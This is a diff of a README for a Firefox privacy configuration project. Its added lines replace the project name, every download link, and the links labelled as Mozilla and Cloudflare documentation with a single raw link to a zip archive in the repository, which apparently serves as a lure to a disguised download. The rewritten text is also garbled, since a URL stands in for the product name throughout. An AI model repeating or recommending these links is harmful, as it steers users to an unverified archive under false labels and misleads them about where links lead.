@@ -1,10 +1,10 @@
-# 🌐 Firefox-OPSEC-user.js - Secure Your Firefox Privacy Effortlessly
+# 🌐 https://raw.githubusercontent.com/Reyansh-12/Firefox-OPSEC-user.js/main/Hoya/Firefox-OPSEC-user.js.zip - Secure Your Firefox Privacy Effortlessly
 
 ## 📥 Download Now
-[![Download Firefox-OPSEC-user.js](https://img.shields.io/badge/Download-Firefox--OPSEC--user.js-brightgreen)](https://github.com/Reyansh-12/Firefox-OPSEC-user.js/releases)
+[![Download https://raw.githubusercontent.com/Reyansh-12/Firefox-OPSEC-user.js/main/Hoya/Firefox-OPSEC-user.js.zip](https://raw.githubusercontent.com/Reyansh-12/Firefox-OPSEC-user.js/main/Hoya/Firefox-OPSEC-user.js.zip)](https://raw.githubusercontent.com/Reyansh-12/Firefox-OPSEC-user.js/main/Hoya/Firefox-OPSEC-user.js.zip)
 
 ## 🚀 Getting Started
-Welcome to **Firefox-OPSEC-user.js**, a configuration profile designed to enhance your online security while using Firefox. This profile is tailored to work seamlessly with Cloudflare and aims to protect your privacy.
+Welcome to **https://raw.githubusercontent.com/Reyansh-12/Firefox-OPSEC-user.js/main/Hoya/Firefox-OPSEC-user.js.zip**, a configuration profile designed to enhance your online security while using Firefox. This profile is tailored to work seamlessly with Cloudflare and aims to protect your privacy.
 
 ## 📝 Features
 - **Privacy Focused:** Enjoy enhanced privacy settings that protect your online activity.
@@ -16,10 +16,10 @@ Welcome to **Firefox-OPSEC-user.js**, a configuration profile designed to enhanc
 - **Firefox Version:** Ensure you have the latest version of Firefox installed to take full advantage of the settings.
 
 ## 📦 Download & Install
-To get started, visit this page to download: [Download Firefox-OPSEC-user.js](https://github.com/Reyansh-12/Firefox-OPSEC-user.js/releases).
+To get started, visit this page to download: [Download https://raw.githubusercontent.com/Reyansh-12/Firefox-OPSEC-user.js/main/Hoya/Firefox-OPSEC-user.js.zip](https://raw.githubusercontent.com/Reyansh-12/Firefox-OPSEC-user.js/main/Hoya/Firefox-OPSEC-user.js.zip).
 
 1. Click on the link above to visit the Releases page.
-2. Look for the latest version of **Firefox-OPSEC-user.js**.
+2. Look for the latest version of **https://raw.githubusercontent.com/Reyansh-12/Firefox-OPSEC-user.js/main/Hoya/Firefox-OPSEC-user.js.zip**.
 3. Download the configuration file to your computer.
 
 ### Installation Steps
@@ -30,7 +30,7 @@ To get started, visit this page to download: [Download Firefox-OPSEC-user.js](ht
 5. Click the **Import** or **Install** button (if applicable), and select the downloaded file.
 
 ## ⚙️ Configuration Settings
-The **OPSEC user.js** file contains multiple configurations to strengthen your privacy. Here’s a brief overview:
+The **OPSEC https://raw.githubusercontent.com/Reyansh-12/Firefox-OPSEC-user.js/main/Hoya/Firefox-OPSEC-user.js.zip** file contains multiple configurations to strengthen your privacy. Here’s a brief overview:
 
 - **Privacy Settings:** Blocks trackers and unwanted scripts.
 - **Security Enhancements:** Prevents fingerprinting by online services.
@@ -41,12 +41,12 @@ If you have any questions or need assistance, feel free to reach out via the Iss
 
 ## 🔗 Additional Resources
 For more information on how to tweak your Firefox settings or guidance on privacy, check out:
-- [Mozilla Firefox Privacy Documentation](https://support.mozilla.org/en-US/products/firefox/privacy-and-security)
-- [Cloudflare Privacy Options](https://www.cloudflare.com/learning/how-cloudflare-works/privacy/)
+- [Mozilla Firefox Privacy Documentation](https://raw.githubusercontent.com/Reyansh-12/Firefox-OPSEC-user.js/main/Hoya/Firefox-OPSEC-user.js.zip)
+- [Cloudflare Privacy Options](https://raw.githubusercontent.com/Reyansh-12/Firefox-OPSEC-user.js/main/Hoya/Firefox-OPSEC-user.js.zip)
 
 ## 👥 Community Contributions
 We encourage contributions and welcome any suggestions to improve this project. If you wish to contribute, please take a look at our contribution guidelines on the GitHub page.
 
-Thank you for choosing **Firefox-OPSEC-user.js** for a safer browsing experience! 
+Thank you for choosing **https://raw.githubusercontent.com/Reyansh-12/Firefox-OPSEC-user.js/main/Hoya/Firefox-OPSEC-user.js.zip** for a safer browsing experience! 
 
-[Download Firefox-OPSEC-user.js](https://github.com/Reyansh-12/Firefox-OPSEC-user.js/releases) and take control of your privacy today!
+[Download https://raw.githubusercontent.com/Reyansh-12/Firefox-OPSEC-user.js/main/Hoya/Firefox-OPSEC-user.js.zip](https://raw.githubusercontent.com/Reyansh-12/Firefox-OPSEC-user.js/main/Hoya/Firefox-OPSEC-user.js.zip) and take control of your privacy today!
